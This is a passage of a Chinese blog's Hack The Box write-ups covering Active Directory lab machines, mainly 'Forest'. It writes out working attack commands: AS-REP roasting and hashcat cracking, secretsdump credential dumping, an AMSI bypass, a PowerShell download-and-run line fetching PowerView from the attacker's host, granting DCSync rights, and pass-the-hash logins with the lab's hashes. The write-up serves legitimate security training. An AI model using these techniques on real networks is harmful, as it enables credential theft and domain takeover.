<p>我们发现了一个可疑的用户。虽然是找到了用户名，但是我们不没有找到相对应的凭据。这时候我们切换一下思路，浏览一下web服务中有什么有价值的信息可以提供给我们的。<br><img src="https://img-blog.csdnimg.cn/b628002a16b3488681fd917e8308c38f.png" alt="在这里插入图片描述"><br>在关于页面，我们看到了这两个用户的信息，长得貌似和我们信息收集出来的用户信息有点类似。那我们可以猜测这有可能是系统中真实存在的用户。<br><img src="https://img-blog.csdnimg.cn/c588d6ef57d149fabf5e731d9cc5036d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们尝试获取一下用户对应的哈希值，使用的工具是kerbrute，发现存在<code>hsmith</code>和<code>fsmith</code>这两个用户并且发现了它们的TGT条目。<img src="https://img-blog.csdnimg.cn/2627486af25c47ab96b900a0ec75f39b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们先使用impacket包中的<code>GetNPUsers.py</code>获取fsmith用户的hash值。<br><img src="https://img-blog.csdnimg.cn/c0949aa761a34cd5ac4cb072c102afb1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们将他的hash值保存为一个文件，使用hashcat尝试能不能破解成功。破解成功的密码明文值为<code>Thestrokes23</code>。这里解释一下参数的含义，-m指的是指定文件的散列值类型，-a指的是指定破解模式，-w是指定字典。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 -a 0 -w 3 fsmith.hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/41e6765292b042028af2e5a18a7e63c0.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e09120c6a3ab4d2ebc84502a9a0a58b4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/353674983008426c8e5578b2c332cf9c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>既然破解到了密码，那我们可以登录SMB和WinRM服务了。我们先查看SMB服务，发现了两个共享服务，但是没有一个是有用的。。。<br><img src="https://img-blog.csdnimg.cn/03e072a109fb4bbea8beb8f0a955ab09.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那我们尝试利用WinRM吧，登录成功，拿到第一个flag值。<br><img src="https://img-blog.csdnimg.cn/6b0e08188c09403f95a20de67f6292de.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们拿到的只是普通用户的权限，我们的目标当然是管理员权限。首先我们先看看都存在哪些用户，发现存在一个svc_loanmgr用户。<br><img src="https://img-blog.csdnimg.cn/db445cc21449494680e87b2d7ae329f8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用powershell命令查看到它对应的密码。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&#x27;</span> | <span class="built_in">select</span> <span class="string">&quot;Default*&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/d774cd7d287541eb8c6c68b368fe0424.png" alt="在这里插入图片描述"><br>这个命令要记住它还是有一定难度的，我们也可以通过上传<code>WindowsEnum.ps1</code>脚本来完成这任务。<br><img src="https://img-blog.csdnimg.cn/86d1160f61414340a78ab8afd834f34a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/8c4904ed1ffe46219f42192926e2b54c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现这个密码后，我们可以尝试使用登陆进去。但是我试了很多次都是登陆失败<br><img src="https://img-blog.csdnimg.cn/431a23d1a026444781060ce56c83ade6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那没办法了，我尝试使用<code>secretsdump.py</code>脚本看看能不能成功获取到这个用户的哈希值。我们意外发现administrator的hash值，发大财了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py -dc-ip 10.10.10.175 svc_loanmgr:Moneymakestheworldgoround\!@10.10.10.175</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/24f4c7e28cee4d33bef37d56e48ad59a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用<code>evil-winrm</code>进行登录，同时我们还可以使用<code>wmiexec.py</code>这个脚本进行登录，但是后者的速度要相较前者慢得多</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/42316c86c9ba4720b9fd0f6684ecec19.png" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmiexec.py -hashes :823452073d75b9d1cf70ebdf86c7f98e administrator@10.10.10.175</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b57c846f068946208ef0673c1765edf0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Forest</title>
    <url>/2021/12/24/Forest/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><img src="https://img-blog.csdnimg.cn/2913cb4eedb44306869932340084824e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV -sS -Pn -A -p1-65535 10.10.10.161</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.161</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 65511 closed ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53/tcp    open  domain       Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-10-21 11:03:55Z)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf       .NET Message Framing</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49671/tcp open  unknown</span><br><span class="line">49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49677/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49684/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49706/tcp open  unknown</span><br><span class="line">49931/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.91%E=4%D=10/21%OT=53%CT=1%CU=36900%PV=Y%DS=2%DC=T%G=Y%TM=617148</span><br><span class="line">OS:13%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=103%TI=I%CI=I%II=I%SS=S%TS</span><br><span class="line">OS:=A)SEQ(SP=104%GCD=1%ISR=104%TI=I%CI=I%TS=A)OPS(O1=M54DNW8ST11%O2=M54DNW8</span><br><span class="line">OS:ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=20</span><br><span class="line">OS:00%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M5</span><br><span class="line">OS:4DNW8NNS%CC=Y%Q=)ECN(R=N)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%D</span><br><span class="line">OS:F=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O</span><br><span class="line">OS:=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W</span><br><span class="line">OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)</span><br><span class="line">OS:T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%U</span><br><span class="line">OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h26m49s, deviation: 4h02m32s, median: 6m47s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: FOREST</span><br><span class="line">|   NetBIOS computer name: FOREST\x00</span><br><span class="line">|   Domain name: htb.local</span><br><span class="line">|   Forest name: htb.local</span><br><span class="line">|   FQDN: FOREST.htb.local</span><br><span class="line">|_  System time: 2021-10-21T04:05:16-07:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-10-21T11:05:15</span><br><span class="line">|_  start_date: 2021-10-21T07:03:53</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 1723/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   321.85 ms 10.10.14.1</span><br><span class="line">2   321.83 ms 10.10.10.161</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 3716.43 seconds</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>我们发现可以进行匿名登录，我们尝试匿名登录SMB服务，看看有哪些有价值的信息<br><img src="https://img-blog.csdnimg.cn/e568f2f0f0ef419da569481703bc97f1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>答案是没有，没有什么共享信息<br><img src="https://img-blog.csdnimg.cn/9315d9655d274be9baf1173d824bbf38.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>上面信息收集时发现了ldap服务，那我们尝试使用ldapsearch工具对<code>namingcontexts</code>字段进行发掘<br><img src="https://img-blog.csdnimg.cn/5159dbdc249c4274ba73c56d802ba67c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们尝试更深入地挖掘DN信息，并尝试获取域中的用户列表<br><img src="https://img-blog.csdnimg.cn/412eb99806c84827a8d4924b17aab912.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们还可以使用<code>enum4linux</code>获取用户<br><img src="https://img-blog.csdnimg.cn/295e9874f8a94b21b77a12fd68e7de09.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们将搜集的信息保存为一个<code>anon_ldap.txt</code>文件，过滤出<code>svc-alfresco</code>用户的信息<br><img src="https://img-blog.csdnimg.cn/323186c2631f445e8f56396ebc761eef.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那我们拿到账号和用户名后，我们得检查一下是否启用了预认证，这里解释一下什么是预认证</p>
<blockquote>
<p><strong>在请求 TGT（票证授予票证）时，第一步，请求方（用户）使用自己的 NTLM 哈希加密时间戳，并将其发送到 KDC（密钥分发中心），即域控制器。现在，如果 KDC 使用请求用户的 NTLM 哈希成功解密时间戳，KDC 将知道请求用户是有效用户。<br>可以禁用此检查（这不是默认情况）。在这种情况下，KDC 不会验证请求 TGT 的用户是否有效，而是将 TGT 发送回请求者。<br>该 TGT 包含使用请求用户的 NTLM 哈希加密的部分数据，这意味着我们可以将哈希脱机并尝试破解它。</strong></p>
</blockquote>
<p>那我们可以使用<code>impacket</code>包中的<code>GetNPUsers.py</code>这个脚本去请求TGT，直接获取易受攻击的用户名及对应的哈希值<br><img src="https://img-blog.csdnimg.cn/5284eb6938a448ed9fc2c450536c9ebc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用<code>john</code>来破解这个hash值，破解的明文值为<code>s3rvice</code><br><img src="https://img-blog.csdnimg.cn/171d16fb086e4306aed46bcfde8464e3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们也可以用hashcat来破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 -a 0 -w 3 forest.hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/ac55b719cfc140b1ada3ab3f1ec23de1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>因为上边我们扫描到主机开放了5985端口，那证明主机开放了WinRM服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u <span class="string">&#x27;svc-alfresco&#x27;</span> -p <span class="string">&#x27;s3rvice&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/391c73ad0f65465dbec84f80162fe866.png" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们使用Bloodhound这个工具查询是否有潜在的提权路径，首先我们得先把客户端<code>SharpHound.exe</code>上传到目标主机上，并运行它<br><img src="https://img-blog.csdnimg.cn/df95f275e38340aba9d52b2aa90c838e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/eaa70b145a0143d790b4d8c629a36d7f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>为了方便我们传输，我们在本机上搭建一个SMB服务器<br><img src="https://img-blog.csdnimg.cn/a6dcecf002764ceb89b526cfc469f895.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们将压缩包复制到本机上<br><img src="https://img-blog.csdnimg.cn/9c2108c5892d4762af178e042896411e.png" alt="在这里插入图片描述"><br>在攻击机上启动bloodhound，并将压缩包拖进bloodhound中<br><img src="https://img-blog.csdnimg.cn/0e1aedb210f74238ba29dd65d3cfb738.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后点击最后一个选项，查看可以进行哈希传递的用户<br><img src="https://img-blog.csdnimg.cn/7d5109e17fd740c08689be66a2ce0c35.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后再点击这个选项<br><img src="https://img-blog.csdnimg.cn/e417b9a4c91442eeb7e5f52dc99ec7be.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6899426da41d42139be684f6f99e7772.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到<code>svc-alfresco</code>这个用户是属于<code>service account</code>这个组的成员，同时它也是<code>Privileged IT Accounts</code>的成员，它也是<code>account operators</code>的成员。它允许该组的成员创建和修改用户并将其添加到不受保护的组<br><img src="https://img-blog.csdnimg.cn/e2cdb6b465b74640a64b7ea297939ce3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那我们现在点击<code>Shortest Paths to High Value Targets</code>，查看去往高权限目标的路径。该用户具有<code>GenericAll</code>的权限和<code>Exchange Windows</code>权限组。在<code>Exchange Windows</code>权限组具有<code>WriteDacl</code>在域的权限。该<code>WriteDacl</code>权限使用户能够向对象添加<code>DACL</code>（自由访问控制列表）。<br><img src="https://img-blog.csdnimg.cn/c6d80a75b47946b2bb2b74041117d941.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>那就意味着：</strong></p>
<p> <strong>1. 我们可以将用户添加到Exchange Windows 权限组。<br> 2. 然后，由于 Exchange 组有WriteDacl权限，我们可以将DCSync权限授予我们创建的用户。</strong></p>
<blockquote>
<p> <strong>DCsync是几个权限的集合体，是域渗透中经常会用到的技术，如果普通用户想具有DCsync权限，可以给对象添加以下三条ACE：<br> DS-Replication-Get-Changes，对应GUID为：1131f6aa-9c07-11d1-f79f-00c04fc2dcd2<br> DS-Replication-Get-Changes-All，对应GUID为：1131f6ad-9c07-11d1-f79f-00c04fc2dcd2<br> DS-Replication-Get-Changes-In-Filtered-Set，对应GUID为：89e95b76-444d-4c62-991a-0facbeda640c</strong></p>
</blockquote>
<h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><p>首先我们先将用户添加到域中<br><img src="https://img-blog.csdnimg.cn/412def70d225418188f892346169b474.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们将用户添加到<code>Exchange Windows</code>权限组<br><img src="https://img-blog.csdnimg.cn/ead54544e07d4f67bcb1f4d5c4c973d0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们看看菜单，我们选择<code>Bypass-4MSI</code>，<code>Bypass-4MSI</code>命令用于在导入脚本之前规避防御者。接下来，我们可以使用<code>Add-ObjectACL</code>和<code>john</code>的凭证，并给他<code>DCSync</code>权限。<br><img src="https://img-blog.csdnimg.cn/84b58436b0f54790bfdc7e1e5823e29a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后输入以下的powershell的代码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\Documents&gt; <span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).downloadString(<span class="string">&#x27;http://10.10.14.11/PowerView.ps1&#x27;</span>)</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\Documents&gt; <span class="variable">$Secpassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;password1234&#x27;</span> <span class="literal">-asplaintext</span> <span class="literal">-force</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\Documents&gt; <span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;HTB\pyh&#x27;</span>,<span class="variable">$Secpassword</span>)</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\Documents&gt; <span class="built_in">Add-ObjectAcl</span> <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;DC=htb,DC=local&quot;</span> <span class="literal">-PrincipalIdentity</span> pyh <span class="literal">-Rights</span> DCSync</span><br></pre></td></tr></table></figure>
<p>开启一个小型服务器<br><img src="https://img-blog.csdnimg.cn/37f75053912d4977b8ec82cc263da07f.png" alt="在这里插入图片描述"><br>执行完成后，我们使用<code>secretdumps.py</code>脚本获取用户名对应的哈希值。这里我们获取到了管理员的哈希值<br><img src="https://img-blog.csdnimg.cn/16f9219409ec4fa78100ba391a0cf942.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么我们只需要使用<code>psexec.py</code>脚本来进行哈希传递攻击，获取到超级管理员权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/87f2253887984b2f8852806cd45909bb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Valentine</title>
    <url>/2021/12/24/Valentine/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><img src="https://img-blog.csdnimg.cn/48b5e5c02ff845d5b280499511915293.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>可以看到主机开放了web服务和ssh服务，这里发现了<code>valentine.htb</code>这个子域，我们可以将它对应的解析地址添加到hosts文件中去<br><img src="https://img-blog.csdnimg.cn/a1a3512aec184664808f7b0dfdab121b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

